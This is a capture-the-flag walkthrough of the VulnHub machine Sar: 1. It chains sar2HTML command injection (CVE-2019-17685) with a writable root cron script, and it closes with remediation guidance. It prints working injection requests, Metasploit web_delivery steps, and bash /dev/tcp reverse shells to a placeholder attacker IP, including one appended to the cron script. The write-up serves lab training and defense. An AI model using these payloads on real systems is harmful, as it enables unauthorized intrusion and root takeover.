# Sar: 1 — When the Monitoring Tool Becomes the Attack Surface

Look guys!! This one is elegant in its simplicity. Sar: 1 teaches two clean lessons back to back: sar2HTML 3.2.1 has an unauthenticated RCE via a command injection in the `plot` parameter (CVE-2019-17685), and then there is a cron-executed shell script that is writable by www-data. Two vulnerabilities, both trivially exploitable, together they give you root from a single web page. No rabbit holes. No guessing. Just find the service, exploit the known CVE, and inject into the cron script. This is exactly the kind of chain you find in real engagements. Goated machine for beginners.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Sar: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/sar-1,425/ |
| **Techniques** | Nmap, robots.txt enumeration, sar2HTML RCE (CVE-2019-17685), Metasploit web_delivery, www-data shell, cron script injection, reverse shell to root |
| **CVEs** | CVE-2019-17685 (sar2HTML 3.2.1: command injection via plot parameter, unauthenticated RCE) |
| **APT Groups** | APT41: known for rapid exploitation of newly disclosed CVEs in monitoring and management tools for initial access in enterprise environments; Lazarus Group: uses web application vulnerabilities as initial access vectors before deploying credential-harvesting and persistence payloads |

---

## Attack Summary

```
nmap -p- -A
  |
  +-- port 80 HTTP (Apache)
        |
        +-- robots.txt -> /sar2html
              |
              +-- sar2HTML 3.2.1 -> CVE-2019-17685
                    |
                    +-- ?plot=;id -> RCE as www-data
                          |
                          +-- Metasploit web_delivery -> reverse shell
                                |
                                +-- find cron + writable finally.sh
                                      |
                                      +-- inject reverse shell -> cron runs as root
                                            |
                                            +-- root shell
                                                  |
                                                  +-- /root/root.txt
```

---

## Methodology

1. Network discovery and port scan: single port 80
2. Web enumeration: robots.txt reveals `/sar2html`
3. Fingerprint sar2HTML version (3.2.1): vulnerable to CVE-2019-17685
4. Exploit via `plot` parameter command injection
5. Deliver reverse shell using Metasploit web_delivery module
6. Post-exploitation: find cron jobs and writable scripts
7. Inject reverse shell payload into cron-executed script
8. Wait for cron execution to get root shell

---

## Step 1 — Network Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.29.0/24
# Target: 192.168.29.212

nmap -p- -A 192.168.29.212
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29
```

Only HTTP. No SSH, no FTP. The entire attack surface is the web application. This simplifies enumeration: go deep on HTTP.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

Browse to `http://192.168.29.212/`. Check robots.txt first (always do this before running tools):

```bash
curl http://192.168.29.212/robots.txt
```

```
User-agent: *
Disallow: /sar2html
```

`robots.txt` is telling crawlers not to index `/sar2html`. For a CTF attacker, that is an explicit invitation. Browse to:

```
http://192.168.29.212/sar2html
```

This reveals sar2HTML, a web-based viewer for Linux `sar` (System Activity Report) data. The version 3.2.1 is displayed in the interface footer.

**Real-world note:** robots.txt should never be used to hide sensitive paths. It is a public document: every search engine crawler and every attacker reads it first. Hiding admin panels or monitoring tools behind robots.txt disallows provides zero security while actively pointing attackers at the interesting endpoints.

**MITRE ATT&CK:** T1595.003 — Active Scanning: Wordlist Scanning; T1083 — File and Directory Discovery

---

## Step 3 — CVE-2019-17685: sar2HTML Command Injection

sar2HTML 3.2.1 passes the `plot` GET parameter directly to a shell command without sanitization. This enables unauthenticated command injection.

Verify the vulnerability manually:

```bash
curl "http://192.168.29.212/sar2html/index.php?plot=;id"
# Output includes: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `id` command output appears in the response HTML, confirming RCE as `www-data`.

Also test for accessible files:

```bash
curl "http://192.168.29.212/sar2html/index.php?plot=;cat+/etc/passwd"
# Reveals system users
```

**Real-world note:** sar2HTML was designed for internal network use, not internet exposure. CVE-2019-17685 affects the `plot` parameter that renders performance graphs. Unauthenticated monitoring tools with command execution are consistently found in internal assessments, especially on Linux servers where admins install performance utilities and forget they are web-accessible.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 4 — Reverse Shell via Metasploit web_delivery

Start a Metasploit listener and use web_delivery to get a stable shell:

```bash
msfconsole
use exploit/multi/script/web_delivery
set TARGET 7         # Linux/Python
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

Metasploit generates a curl command to execute. Deliver it via the CVE:

```bash
# URL-encode the curl command from web_delivery output
# Inject via plot parameter:
curl "http://192.168.29.212/sar2html/index.php?plot=;<encoded_web_delivery_command>"
```

Alternatively, use a simpler bash reverse shell:

```bash
# Start listener:
nc -lvnp 4444

# Inject via CVE:
curl "http://192.168.29.212/sar2html/index.php?plot=;bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'"
```

You receive a callback as `www-data`. Stabilize immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z -> stty raw -echo; fg -> Enter twice
```

**MITRE ATT&CK:** T1059.004 — Unix Shell; T1071.001 — Application Layer Protocol: Web Protocols

---

## Step 5 — Post-Exploitation: Find Cron Jobs and Writable Scripts

Enumerate cron jobs:

```bash
cat /etc/crontab
ls -la /etc/cron*
crontab -l 2>/dev/null
```

Find in `/etc/crontab` or similar:

```
*/5 * * * * root /var/www/html/finally.sh
```

Root runs `finally.sh` every 5 minutes. Check if it is writable:

```bash
ls -la /var/www/html/finally.sh
# -rwxrwxrwx 1 www-data www-data ... /var/www/html/finally.sh
# OR
# writable by www-data group
```

This is the privilege escalation vector. The script is writable by `www-data` (our current user) and runs as root via cron.

**Real-world note:** Cron scripts owned or writable by service accounts are a classic privilege escalation path in Linux environments. This happens when developers set permissions lazily during initial setup. The cron job is properly restricted (runs as root) but the script file has world-writable permissions, which completely defeats the restriction.

**MITRE ATT&CK:** T1053.003 — Scheduled Task: Cron; T1083 — File and Directory Discovery

---

## Step 6 — Inject Reverse Shell and Wait for Root

Append a reverse shell payload to the cron script:

```bash
# Start a second listener:
nc -lvnp 9999

# Inject into the script:
echo "bash -i >& /dev/tcp/<attacker_ip>/9999 0>&1" >> /var/www/html/finally.sh
```

Wait up to 5 minutes for the cron job to fire. When it runs as root, you get the callback:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

(ﾉ◕ヮ◕)ﾉ Root. Clean, simple, satisfying.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo (cron abuse variant); T1053.003 — Scheduled Task: Cron

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| User flag | (varies) | /home/love/Desktop/user.txt | www-data shell access |
| RCE proof | uid=33(www-data) | CVE-2019-17685 via plot parameter | sar2html command injection |
| Root flag | (varies) | /root/root.txt | Cron script injection |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | robots.txt revealing hidden monitoring tool | robots.txt is a public file read by both crawlers and attackers; it actively highlights endpoints you want hidden | Never hide sensitive paths in robots.txt; use proper access controls instead |
| 2 | sar2HTML 3.2.1 unauthenticated RCE (CVE-2019-17685) | Monitoring and performance tools (sar, Nagios, Zabbix, Prometheus) are consistently overlooked in hardening programs | Keep monitoring tools off public interfaces; require authentication; update to patched versions |
| 3 | Cron script writable by web service user | Writable cron scripts are a top-5 Linux privilege escalation finding in real penetration tests | Cron scripts must be owned by root and not world-writable; audit with: find /etc/cron* -writable 2>/dev/null |
| 4 | Single HTTP service as entire attack surface | Networks with minimal exposed services are easier to defend, but a single vulnerable web application is sufficient for full compromise | Defense in depth: harden the web application AND the underlying OS; monitor file integrity on cron scripts |
| 5 | Five-minute cron interval: short wait for root | Time-based privesc (cron jobs, systemd timers) is reliable and common in real environments | Audit all cron jobs and systemd timers on every assessed Linux host |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | Execution | Scheduled Task: Cron | T1053.003 |
| Command and Control | C2 | Application Layer Protocol: Web Protocols | T1071.001 |
| Privilege Escalation | Privilege Escalation | Scheduled Task: Cron (writable script) | T1053.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Patch sar2HTML** — update to a version that sanitizes the `plot` parameter; or remove the application entirely if not required
2. **Restrict sar2HTML access** — place behind authentication; restrict to internal network only; never expose on public interfaces
3. **Fix robots.txt** — remove sensitive paths from robots.txt; implement proper access control instead
4. **Harden cron script permissions** — all cron-executed scripts must be: owned by root, mode 750 (rwxr-x---), not writable by any service account
5. **Monitor cron script integrity** — use file integrity monitoring (AIDE, Wazuh FIM) on all cron-executed scripts

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-accessible monitoring and utility tools |
| Protect | Protective Technology | Authenticate sar2HTML; restrict to internal network |
| Protect | Data Security | Fix cron script permissions; apply least-privilege ownership |
| Detect | Anomalies and Events | FIM alerts on cron scripts; alert on new PHP/bash scripts in web root |
| Respond | Response Planning | Remove sar2HTML; rotate compromised service account credentials |
| Recover | Recovery Planning | Rebuild host; re-baseline cron configuration |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Authenticate web-accessible monitoring tools |
| AC-6 | Least Privilege | Cron scripts owned by root, not writable by service accounts |
| CM-7 | Least Functionality | Expose monitoring tools on internal networks only |
| SI-2 | Flaw Remediation | Patch CVE-2019-17685 (sar2HTML RCE) |
| SI-7 | Software and Firmware Integrity | FIM on cron-executed scripts |

### CISA KEV

CVE-2019-17685 is an actively exploited vulnerability in sar2HTML. Monitoring tools with known RCE vulnerabilities are highlighted in multiple CISA alerts (AA20-245A, AA22-074A) as common initial access vectors in enterprise intrusions.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 (patch CVE-2019-17685; add to vuln scan scope) |
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL2 (inventory monitoring tools; track versions) |
| Situational Awareness (SITUATION) | Monitor | MIL2 (FIM on cron scripts; alert on web root changes) |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening: authenticate sar2HTML; remove from public internet; patch CVE-2019-17685
- **D3-FIM** — File Integrity Monitoring: monitor cron scripts and web root for unauthorized changes
- **D3-OAM** — OS Administrative Management: fix cron script permissions; root ownership only

---

## Final Thoughts

Sar: 1 is one of the cleanest beginner chains on VulnHub. Two vulnerabilities, a known CVE and a misconfigured cron script, chained together to go from nothing to root. Every step is realistic and maps directly to findings in actual Linux penetration tests.

The machine teaches two habits that stick: read robots.txt before running tools, and always check cron jobs for writable scripts. Both take less than 30 seconds and catch real findings on real systems.

Big props to the creator for keeping it tight.

Thanks guys!! (❍ᴥ❍ʋ)
